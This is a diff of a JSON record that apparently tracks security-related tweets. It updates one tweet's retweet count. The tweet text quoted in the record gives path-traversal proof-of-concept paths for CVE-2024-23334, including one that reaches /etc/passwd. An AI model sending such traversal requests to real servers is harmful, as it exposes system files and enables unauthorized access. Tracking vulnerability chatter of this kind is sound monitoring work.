@@ -80,7 +80,7 @@
     "tweetfavorites": 0,
     "tweetquotes": 0,
     "tweetreplies": 0,
-    "tweetretweets": 95,
+    "tweetretweets": 98,
     "tweettext": "RT @W01fh4cker: CVE-2024-23334\n\nPoc for windows: /static/../D:\\flag.txt\nPoc for Linux: /static/../../../../etc/passwd [need to fuzz \"../\"]…",
     "tweettime": "2024-02-28, 06:16:44",
     "tweeturl": "https://twitter.com/piedpiper1616/status/1762723488039907541",
